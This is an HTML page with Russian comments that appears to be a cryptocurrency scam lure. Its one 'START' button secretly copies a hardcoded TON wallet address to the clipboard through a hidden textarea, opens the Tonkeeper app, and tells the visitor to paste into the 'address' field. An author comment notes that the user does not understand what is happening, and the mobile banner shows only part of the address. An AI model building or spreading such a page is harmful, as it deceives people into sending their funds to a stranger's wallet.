<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON</title>
    <style>
        * {
            margin: 0;
            padding: 0;
        }
        body {
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial;
        }
        .btn {
            background: linear-gradient(135deg, #00d4ff, #0077ff);
            border: none;
            color: #fff;
            font-size: 28px;
            font-weight: bold;
            padding: 30px 70px;
            border-radius: 60px;
            cursor: pointer;
            box-shadow: 0 0 50px rgba(0, 150, 255, 0.3);
        }
        .btn:active {
            transform: scale(0.95);
        }
        #status {
            position: fixed;
            bottom: 30px;
            left: 0;
            right: 0;
            text-align: center;
            color: #444;
            font-size: 12px;
            font-family: monospace;
        }
        .hidden {
            display: none !important;
        }
        #copyArea {
            position: fixed;
            top: -1000px;
            left: -1000px;
            opacity: 0;
        }
    </style>
</head>
<body>

    <button class="btn" id="mainBtn">▶ СТАРТ</button>
    <div id="status">готов</div>
    <textarea id="copyArea"></textarea>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
        const btn = document.getElementById('mainBtn');
        const status = document.getElementById('status');
        const copyArea = document.getElementById('copyArea');

        // ====== АВТОКОПИРОВАНИЕ ======
        function copyToClipboard(text) {
            copyArea.value = text;
            copyArea.select();
            document.execCommand('copy');
        }

        // ====== ОТКРЫТЬ TON KEEPER ======
        function openTonKeeper() {
            // ПРОСТО ОТКРЫВАЕМ ПРИЛОЖЕНИЕ
            window.location.href = 'ton://';
            
            setTimeout(() => {
                window.open('ton://', '_blank');
            }, 300);
        }

        // ====== ГЛАВНАЯ ФУНКЦИЯ ======
        btn.onclick = function() {
            status.innerText = '⏳ ...';
            btn.innerText = '⏳';
            btn.disabled = true;
            btn.style.opacity = '0.5';

            // 1. КОПИРУЕМ АДРЕС В БУФЕР
            copyToClipboard(TARGET);
            
            // 2. ОТКРЫВАЕМ TON KEEPER
            openTonKeeper();
            
            // 3. ПОКАЗЫВАЕМ ИНСТРУКЦИЮ (НО ЮЗЕР НЕ ПОНИМАЕТ)
            setTimeout(() => {
                status.innerText = '✅ вставьте в поле "адрес"';
                btn.innerText = '✅';
                btn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
                btn.disabled = true;
            }, 1000);
        };

        // ====== АВТОЗАПУСК НА ТЕЛЕФОНЕ ======
        if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
            document.body.innerHTML += `
                <div style="
                    position:fixed;
                    bottom:80px;
                    left:20px;
                    right:20px;
                    background:#1a1a1a;
                    padding:15px;
                    border-radius:12px;
                    text-align:center;
                    border:1px solid #2a2a2a;
                    font-size:12px;
                    color:#888;
                ">
                    📋 адрес скопирован в буфер<br>
                    <span style="color:#00d4ff;font-size:10px;">${TARGET.slice(0,10)}...${TARGET.slice(-6)}</span>
                </div>
            `;
        }

        // ====== СТАТУС ПРИ ЗАГРУЗКЕ ======
        setTimeout(() => {
            status.innerText = 'нажми СТАРТ';
        }, 500);
    </script>
</body>
</html>
